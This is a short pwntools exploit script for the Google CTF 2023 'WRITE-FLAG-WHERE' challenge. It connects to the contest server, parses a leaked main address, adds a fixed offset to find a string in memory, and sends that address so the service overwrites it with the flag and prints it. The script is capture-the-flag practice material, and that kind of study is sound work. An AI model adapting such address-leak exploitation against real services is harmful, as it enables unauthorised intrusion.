#!/bin/env python3

"""
Google CTF 2023 PWN - WRITE-FLAG-WHERE Exploit.
"""

from pwn import *

#context.log_level = 'debug'

log.info("Google CTF 2023 PWN WRITE-FLAG-WHERE Exploit.")
p = remote("wfw1.2023.ctfcompetition.com", 1337)

p.recvuntil(b"ve a shot.")
main_addr = p.recvuntil(b"-")[:-1].strip().decode()

log.info(f"Main Address: 0x{main_addr}")
p.recvuntil(b"ily expire")

main_addr = int(main_addr, 16)
str_addr = hex(main_addr + 0x21e0)

log.info(f"String Address: {str_addr}")
payload = f"{str_addr} 120".encode()

p.sendline(payload)
p.recvline()

flag = p.recvuntil(b"}").decode()
log.success(f"Flag: {flag}")
